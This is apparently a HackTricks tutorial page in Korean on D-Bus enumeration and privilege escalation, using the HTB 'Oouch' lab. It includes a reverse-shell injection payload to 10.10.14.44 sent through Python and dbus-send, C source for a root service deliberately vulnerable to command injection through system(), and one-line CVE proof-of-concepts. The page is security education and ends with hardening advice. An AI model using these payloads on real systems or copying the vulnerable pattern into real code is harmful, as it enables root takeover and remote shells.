# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus는 Ubuntu 데스크탑 환경에서 프로세스 간 통신(IPC) 중재자로 사용됩니다. Ubuntu에서는 여러 메시지 버스가 동시에 운영되는 것을 관찰할 수 있습니다: 시스템 버스는 주로 **시스템 전반에 걸쳐 관련된 서비스를 노출하기 위해 특권 서비스에 의해 사용되며**, 각 로그인한 사용자에 대한 세션 버스는 해당 특정 사용자에게만 관련된 서비스를 노출합니다. 여기서는 권한 상승을 목표로 하기 때문에 더 높은 권한(예: root)으로 실행되는 서비스와의 연관성 때문에 시스템 버스에 주로 초점을 맞춥니다. D-Bus의 아키텍처는 각 세션 버스에 대해 '라우터'를 사용하여 클라이언트가 통신하고자 하는 서비스에 대해 지정한 주소에 따라 클라이언트 메시지를 적절한 서비스로 리디렉션하는 역할을 합니다.

D-Bus의 서비스는 그들이 노출하는 **객체**와 **인터페이스**에 의해 정의됩니다. 객체는 표준 OOP 언어의 클래스 인스턴스에 비유될 수 있으며, 각 인스턴스는 **객체 경로**에 의해 고유하게 식별됩니다. 이 경로는 파일 시스템 경로와 유사하게 서비스에 의해 노출된 각 객체를 고유하게 식별합니다. 연구 목적을 위한 주요 인터페이스는 **org.freedesktop.DBus.Introspectable** 인터페이스로, 단일 메소드인 Introspect를 특징으로 합니다. 이 메소드는 객체가 지원하는 메소드, 신호 및 속성의 XML 표현을 반환하며, 여기서는 속성과 신호를 생략하고 메소드에 초점을 맞춥니다.

D-Bus 인터페이스와의 통신을 위해 두 가지 도구가 사용되었습니다: D-Bus에서 노출된 메소드를 스크립트에서 쉽게 호출할 수 있도록 하는 CLI 도구인 **gdbus**와 각 버스에서 사용 가능한 서비스를 열거하고 각 서비스에 포함된 객체를 표시하도록 설계된 Python 기반 GUI 도구인 [**D-Feet**](https://wiki.gnome.org/Apps/DFeet)입니다.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

첫 번째 이미지에서는 D-Bus 시스템 버스에 등록된 서비스가 표시되며, **org.debin.apt**가 시스템 버스 버튼을 선택한 후 특별히 강조됩니다. D-Feet는 이 서비스에 대해 객체를 쿼리하여 선택된 객체의 인터페이스, 메서드, 속성 및 신호를 두 번째 이미지에서 보여줍니다. 각 메서드의 시그니처도 자세히 설명되어 있습니다.

주목할 만한 기능은 서비스의 **프로세스 ID (pid)**와 **명령줄**이 표시되어, 서비스가 상승된 권한으로 실행되는지 확인하는 데 유용하다는 점입니다. 이는 연구의 관련성에 중요합니다.

**D-Feet는 메서드 호출도 허용합니다**: 사용자는 매개변수로 Python 표현식을 입력할 수 있으며, D-Feet는 이를 D-Bus 유형으로 변환한 후 서비스를 호출합니다.

그러나 **일부 메서드는 인증이 필요**하다는 점에 유의해야 합니다. 우리는 자격 증명 없이 권한을 상승시키는 것이 목표이므로 이러한 메서드는 무시할 것입니다.

또한 일부 서비스는 사용자가 특정 작업을 수행할 수 있는지 여부를 확인하기 위해 org.freedeskto.PolicyKit1이라는 다른 D-Bus 서비스에 쿼리합니다.

## **Cmd line Enumeration**

### 서비스 객체 나열

열린 D-Bus 인터페이스를 나열하는 것이 가능합니다:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) 프로세스가 버스에 대한 연결을 설정하면, 버스는 해당 연결에 _고유 연결 이름_이라는 특별한 버스 이름을 할당합니다. 이러한 유형의 버스 이름은 불변이며, 연결이 존재하는 한 변경되지 않을 것이 보장됩니다. 더 중요한 것은, 버스의 수명 동안 재사용될 수 없다는 것입니다. 이는 해당 버스에 대한 다른 연결이 그러한 고유 연결 이름을 할당받지 않음을 의미하며, 동일한 프로세스가 버스에 대한 연결을 닫고 새 연결을 생성하더라도 마찬가지입니다. 고유 연결 이름은 금지된 콜론 문자로 시작하기 때문에 쉽게 인식할 수 있습니다.

### Service Object Info

그런 다음, 다음을 사용하여 인터페이스에 대한 정보를 얻을 수 있습니다:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### List Interfaces of a Service Object

권한이 충분해야 합니다.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### 서비스 객체의 인터페이스 조사

이 예제에서는 `tree` 매개변수를 사용하여 발견된 최신 인터페이스가 선택된 것을 주목하세요 (_이전 섹션 참조_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
`.Block` 인터페이스 `htb.oouch.Block`의 메서드를 주목하세요 (우리가 관심 있는 부분입니다). 다른 열의 "s"는 문자열을 기대하고 있을 수 있습니다.

### 모니터/캡처 인터페이스

충분한 권한이 있으면 (단지 `send_destination` 및 `receive_sender` 권한만으로는 부족합니다) **D-Bus 통신을 모니터링**할 수 있습니다.

**통신을 모니터링**하려면 **root**여야 합니다. 여전히 root로 문제를 겪고 있다면 [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) 및 [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)를 확인하세요.

> [!WARNING]
> D-Bus 구성 파일을 설정하여 **비루트 사용자가 통신을 스니핑할 수 있도록 허용하는 방법**을 알고 있다면 **연락해 주세요**!

모니터링하는 다양한 방법:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
다음 예제에서 인터페이스 `htb.oouch.Block`이 모니터링되고 **메시지 "**_**lalalalal**_**"가 잘못된 의사소통을 통해 전송됩니다**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
`capture` 대신 `monitor`를 사용하여 결과를 pcap 파일에 저장할 수 있습니다.

#### 모든 노이즈 필터링 <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

버스에 정보가 너무 많으면 다음과 같이 일치 규칙을 전달하세요:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
여러 규칙을 지정할 수 있습니다. 메시지가 _어떤_ 규칙과 일치하면 메시지가 출력됩니다. 다음과 같이:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
[D-Bus 문서](http://dbus.freedesktop.org/doc/dbus-specification.html)를 참조하여 매치 규칙 구문에 대한 자세한 정보를 확인하세요.

### 더 많은 정보

`busctl`에는 더 많은 옵션이 있으며, [**여기에서 모두 확인하세요**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **취약한 시나리오**

사용자 **HTB의 "oouch" 호스트 내의 qtc**로서, _/etc/dbus-1/system.d/htb.oouch.Block.conf_에 위치한 **예상치 못한 D-Bus 구성 파일**을 찾을 수 있습니다.
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
이전 구성에서 **정보를 전송하고 수신하려면 `root` 또는 `www-data` 사용자여야 합니다** D-BUS 통신을 통해.

도커 컨테이너 **aeb4525789d8** 내의 사용자 **qtc**로서 _/code/oouch/routes.py_ 파일에서 dbus 관련 코드를 찾을 수 있습니다. 이것이 흥미로운 코드입니다:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
보시다시피, **D-Bus 인터페이스에 연결**하고 **"Block" 함수**에 "client_ip"를 전송하고 있습니다.

D-Bus 연결의 다른 쪽에는 C로 컴파일된 바이너리가 실행되고 있습니다. 이 코드는 **D-Bus 연결에서 IP 주소를 수신 대기하고 있으며 `system` 함수를 통해 iptables를 호출**하여 주어진 IP 주소를 차단합니다.\
**`system` 호출은 명령 주입에 취약하도록 의도적으로 설계되었으므로**, 다음과 같은 페이로드는 리버스 셸을 생성합니다: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

이 페이지의 끝에서 **D-Bus 애플리케이션의 전체 C 코드**를 찾을 수 있습니다. 그 안에는 91-97행 사이에 **`D-Bus 객체 경로`** **및 `인터페이스 이름`**이 **등록되는 방법**이 있습니다. 이 정보는 D-Bus 연결에 정보를 전송하는 데 필요합니다:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
또한, 57번째 줄에서 **이 D-Bus 통신에 등록된 유일한 메서드**가 `Block`이라고 명시되어 있습니다(_**그래서 다음 섹션에서는 페이로드가 서비스 객체 `htb.oouch.Block`, 인터페이스 `/htb/oouch/Block` 및 메서드 이름 `Block`으로 전송될 것입니다**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

다음 파이썬 코드는 `block_iface.Block(runme)`를 통해 `Block` 메서드에 페이로드를 D-Bus 연결로 전송합니다 (_이 코드는 이전 코드 조각에서 추출되었습니다_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl 및 dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send`는 "Message Bus"에 메시지를 보내는 데 사용되는 도구입니다.
- Message Bus – 시스템이 애플리케이션 간의 통신을 쉽게 하기 위해 사용하는 소프트웨어입니다. 이는 Message Queue와 관련이 있지만 (메시지가 순서대로 정렬됨) Message Bus에서는 메시지가 구독 모델로 전송되며 매우 빠릅니다.
- “-system” 태그는 세션 메시지가 아닌 시스템 메시지를 언급하는 데 사용됩니다 (기본값).
- “–print-reply” 태그는 우리의 메시지를 적절하게 출력하고 인간이 읽을 수 있는 형식으로 응답을 받는 데 사용됩니다.
- “–dest=Dbus-Interface-Block” Dbus 인터페이스의 주소입니다.
- “–string:” – 인터페이스에 보내고자 하는 메시지의 유형입니다. 메시지를 보내는 여러 형식이 있으며, 이에는 double, bytes, booleans, int, objpath가 포함됩니다. 이 중 "object path"는 파일의 경로를 Dbus 인터페이스에 보내고자 할 때 유용합니다. 이 경우 특별한 파일(FIFO)을 사용하여 파일 이름으로 인터페이스에 명령을 전달할 수 있습니다. “string:;” – 이는 FIFO 리버스 쉘 파일/명령의 위치에 다시 object path를 호출하기 위한 것입니다.

_`htb.oouch.Block.Block`에서 첫 번째 부분(`htb.oouch.Block`)은 서비스 객체를 참조하고 마지막 부분(`.Block`)은 메서드 이름을 참조합니다._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## 자동화된 열거 도구 (2023-2025)

`busctl`/`gdbus`를 사용하여 대규모 D-Bus 공격 표면을 수동으로 열거하는 것은 빠르게 고통스러워집니다. 최근 몇 년 동안 출시된 두 개의 작은 FOSS 유틸리티는 레드팀 또는 CTF 참여 중에 작업을 빠르게 할 수 있습니다:

### dbusmap ("D-Bus용 Nmap")
* 저자: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* C로 작성됨; 모든 객체 경로를 탐색하고 `Introspect` XML을 가져와 소유 PID/UID에 매핑하는 단일 정적 바이너리 (<50 kB).
* 유용한 플래그:
```bash
# *system* 버스의 모든 서비스를 나열하고 호출 가능한 모든 메서드를 덤프합니다
sudo dbus-map --dump-methods

# Polkit 프롬프트 없이 접근할 수 있는 메서드/속성을 적극적으로 탐색합니다
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* 이 도구는 보호되지 않은 잘 알려진 이름을 `!`로 표시하여, 사용자가 *소유*할 수 있는 서비스(인수) 또는 비특권 셸에서 접근할 수 있는 메서드 호출을 즉시 드러냅니다.

### uptux.py
* 저자: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* 시스템d 유닛의 *쓰기 가능한* 경로와 지나치게 관대한 D-Bus 정책 파일(e.g. `send_destination="*"` )을 찾는 파이썬 전용 스크립트.
* 빠른 사용법:
```bash
python3 uptux.py -n          # 모든 검사를 실행하지만 로그 파일을 작성하지 않음
python3 uptux.py -d          # 자세한 디버그 출력을 활성화
```
* D-Bus 모듈은 아래 디렉토리를 검색하고 일반 사용자가 스푸핑하거나 탈취할 수 있는 서비스를 강조 표시합니다:
* `/etc/dbus-1/system.d/` 및 `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (벤더 오버라이드)

---

## 주목할 만한 D-Bus 권한 상승 버그 (2024-2025)

최근에 발표된 CVE를 주의 깊게 살펴보면 사용자 정의 코드에서 유사한 불안전한 패턴을 발견하는 데 도움이 됩니다. 다음의 높은 영향력을 가진 로컬 EoP 문제는 모두 **시스템 버스**에서 인증/권한 부여가 누락된 데서 비롯됩니다:

| 연도 | CVE | 구성 요소 | 근본 원인 | 원라인 PoC |
|------|-----|-----------|------------|---------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (Logitech HID 데몬) | `logid` 시스템 서비스가 제한 없는 `org.freedesktop.Logiopsd` 인터페이스를 노출하여 *모든* 사용자가 장치 프로필을 변경하고 매크로 문자열을 통해 임의의 셸 명령을 주입할 수 있게 합니다. | `gdbus call -y -d org.freedesktop.Logiopsd -o /org/freedesktop/Logiopsd -m org.freedesktop.Logiopsd.LoadConfig "/tmp/pwn.yml"` |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.18 | 루트로 실행되는 프록시가 호출자 UID/Polkit 컨텍스트를 **전달하지 않고** 레거시 버스 이름을 백엔드 서비스로 전달하므로 모든 전달된 요청이 UID 0으로 처리됩니다. | `gdbus call -y -d com.deepin.daemon.Grub2 -o /com/deepin/daemon/Grub2 -m com.deepin.daemon.Grub2.SetTimeout 1` |
| 2025 | CVE-2025-3931 | Red Hat Insights `yggdrasil` ≤ 0.4.6 | 공개 `Dispatch` 메서드에 ACL이 부족하여 → 공격자가 *패키지 관리자* 작업자에게 임의의 RPM을 설치하도록 지시할 수 있습니다. | `dbus-send --system --dest=com.redhat.yggdrasil /com/redhat/Dispatch com.redhat.yggdrasil.Dispatch string:'{"worker":"pkg","action":"install","pkg":"nc -e /bin/sh"}'` |

주목할 패턴:
1. 서비스가 **시스템 버스에서 루트로 실행됨**.
2. PolicyKit 검사가 없음 (또는 프록시로 우회됨).
3. 메서드가 궁극적으로 `system()`/패키지 설치/장치 재구성으로 이어짐 → 코드 실행.

`dbusmap --enable-probes` 또는 수동 `busctl call`을 사용하여 패치가 적절한 `polkit_authority_check_authorization()` 로직을 백포트하는지 확인합니다.

---

## 강화 및 탐지 빠른 승리

* 세계 쓰기 가능 또는 *전송/수신* 열려 있는 정책을 검색합니다:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* 위험한 메서드에 Polkit을 요구합니다 – 심지어 *루트* 프록시도 자신의 PID 대신 *호출자* PID를 `polkit_authority_check_authorization_sync()`에 전달해야 합니다.
* 장기 실행 도우미에서 권한을 떨어뜨립니다 (버스에 연결한 후 `sd_pid_get_owner_uid()`를 사용하여 네임스페이스를 전환).
* 서비스를 제거할 수 없다면, 적어도 *범위*를 전용 유닉스 그룹으로 제한하고 XML 정책에서 접근을 제한합니다.
* 블루팀: `busctl capture --output=/var/log/dbus_$(date +%F).pcap`로 시스템 버스의 지속적인 캡처를 활성화하고 Wireshark에 가져와 이상 탐지를 수행합니다.

---

## 참고 문헌

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)


- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{{#include ../../banners/hacktricks-training.md}}
